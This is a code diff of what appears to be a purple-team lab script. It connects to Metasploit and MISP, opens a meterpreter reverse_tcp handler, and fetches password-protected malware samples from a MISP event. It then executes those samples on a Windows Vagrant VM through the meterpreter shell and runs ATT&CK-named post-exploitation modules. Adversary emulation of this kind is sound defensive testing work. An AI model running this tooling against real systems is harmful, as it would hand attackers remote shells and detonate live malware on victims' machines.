@@ -6,6 +6,7 @@ from tenacity import retry, stop_after_delay, wait_fixed
 import yaml
 import base64
 import zipfile
+import os 
 
 with open('config.yml', 'r') as file:
     config = yaml.safe_load(file)
@@ -21,14 +22,16 @@ PAYLOAD_DOWNLOAD_PATH = config['misp']['payload_download_path']
 
 main_msf_session_key = 1
 main_msf_session = None
-main_shell = None
+
+MSF_CLIENT = None
+MISP_CLIENT = None
 
 # Initialize MSF Connection
 @retry(wait=wait_fixed(5))
 def init_msf():
     try :
         client = MsfRpcClient(MSF_PASSWORD, port=MSF_RPC_PORT, server=MSF_SERVER, ssl=True)
-        print("[*]  Connected to Metasploit")
+        print("[*] Connected to Metasploit")
         return client
     except Exception as e:
         print("[-] Failed to connect to Metasploit")
@@ -40,7 +43,7 @@ def init_msf():
 def init_misp():
     try:
         misp = PyMISP(MISP_URL, MISP_TOKEN)
-        print("[*]  Connected to MISP")
+        print("[*] Connected to MISP")
         return misp
     except Exception as e:
         print("[-] Failed to connect to MISP")
@@ -48,10 +51,10 @@ def init_misp():
     return None
 
 # Read a given MISP event
-def read_misp_event(misp, event_id):
+def read_misp_event(event_id):
     print()
     print(f"[*] Reading Event #{event_id}")
-    event = misp.get_event(event_id)
+    event = MISP_CLIENT.get_event(event_id)
     event = event['Event']
 
     attribute_galaxy_clusters = jmespath.search("Attribute[].Galaxy[].GalaxyCluster[]", event) 
@@ -72,62 +75,67 @@ def read_misp_event(misp, event_id):
     print()
     print("[*] Found below Malware Samples")
     for item in payloads:
-        print(f"#{item['id']} : {item['value']}")
-        payload_data = item['data']
         download_misp_payload(item)
 
 
 def download_misp_payload(payload, execute=True):
-    
     name, hash = payload['value'].split('|')
+    print(f"[+] Saving {name} to Windows VM.\n\tHash: {hash}")
     with open(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip', 'wb') as w_payload:
         w_payload.write(base64.b64decode(payload['data']))
     
     with zipfile.ZipFile(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip') as zip_file:
         zip_file.extractall(pwd=b"infected", path=PAYLOAD_DOWNLOAD_PATH)
 
+    os.rename(f'{PAYLOAD_DOWNLOAD_PATH}/{hash}', f'{PAYLOAD_DOWNLOAD_PATH}/{name}')
+
     if execute:
-        print(main_shell.run_shell_cmd_with_output(f"C:/Users/vagrant/vagrant_data/{hash}", None))
+        sessions = MSF_CLIENT.sessions.list
+        main_msf_session_key = list(sessions.keys())[0]
+        main_msf_session = sessions[main_msf_session_key]
+        print(f"[*] Selecting Session {main_msf_session_key}")
+        shell = MSF_CLIENT.sessions.session(main_msf_session_key)
+        print(shell.run_shell_cmd_with_output(f"powershell.exe C:\\Users\\vagrant\\vagrant_data\\payloads\\{name}", None))
 
 # Connect to meterpreter
 @retry(stop=stop_after_delay(300))
-def meterpreter_connect(client):
+def meterpreter_connect():
+    global main_msf_session 
     print()
     print("[*] Configuring Metasploit Exploit...")
-    exploit = client.modules.use('exploit', 'multi/handler')
-    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    exploit = MSF_CLIENT.modules.use('exploit', 'multi/handler')
+    payload = MSF_CLIENT.modules.use('payload', 'windows/meterpreter/reverse_tcp')
     payload['LHOST'] = MSF_LHOST
     payload['LPORT'] = MSF_LPORT
 
-    console_id = client.consoles.console().cid
-    console = client.consoles.console(console_id)
+    console_id = MSF_CLIENT.consoles.console().cid
+    console = MSF_CLIENT.consoles.console(console_id)
     print("[*] Listening for connections...")
     console.run_module_with_output(exploit, payload=payload)
 
     print()
     print("[*] Running shell commands:\n")
-    sessions = client.sessions.list
+    sessions = MSF_CLIENT.sessions.list
     main_msf_session_key = list(sessions.keys())[0]
     main_msf_session = sessions[main_msf_session_key]
     print(f"[*] Selecting Session {main_msf_session_key}")
-    main_shell = client.sessions.session(main_msf_session_key)
-    print(main_shell.run_shell_cmd_with_output("net accounts", None))  
+    shell = MSF_CLIENT.sessions.session(main_msf_session_key)
+    print(shell.run_shell_cmd_with_output("net accounts", None))  
 
-def run_t1136(client):
-    exploit = client.modules.use('post', 'windows/purple/t1136')
+def execute_attck(attck_id):
+    exploit = MSF_CLIENT.modules.use(f'post', 'windows/purple/{attck_id}')
     exploit['SESSION'] = main_msf_session_key
-    exploit['USERNAME'] = "test-t1136"
-    exploit['CLEANUP'] = False
-    console_id = client.consoles.console().cid
-    console = client.consoles.console(console_id)
+    console_id = MSF_CLIENT.consoles.console().cid
+    console = MSF_CLIENT.consoles.console(console_id)
     console.run_module_with_output(exploit)
 
 
 def main():
-    # msf_client = init_msf()
-    misp_client = init_misp()
-    misp_event_id = 4
-    read_misp_event(misp_client, misp_event_id)
-    # meterpreter_connect(msf_client)
+    global MSF_CLIENT
+    global MISP_CLIENT
+    MSF_CLIENT = init_msf()
+    MISP_CLIENT = init_misp()
+    meterpreter_connect()
+    read_misp_event(4)
 
 main()
